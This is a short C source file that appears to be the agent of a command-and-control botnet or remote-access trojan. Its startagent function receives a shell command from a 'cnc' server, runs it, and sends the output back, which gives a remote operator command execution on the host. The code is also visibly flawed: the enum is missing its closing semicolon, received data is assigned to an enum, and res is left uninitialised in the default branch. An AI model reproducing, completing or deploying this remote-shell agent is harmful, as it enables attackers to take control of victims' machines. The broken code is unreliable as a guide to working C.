#include "client.h"
#include "shell.h"

#define CMDTYPE_BUFSIZE 1
#define SHELL_BUFSIZE 4096

enum cmdtypes {
    shell
}

void startagent() {
  char* res;
  enum cmdtypes cmdtype = recvfromcnc(CMDTYPE_BUFSIZE);
  switch (cmdtype) {
    case shell:
      res = run(recvfromcnc(SHELL_BUFSIZE));
      break;
    default:
      break;
  }
  sendtocnc(res);
  free(res);
}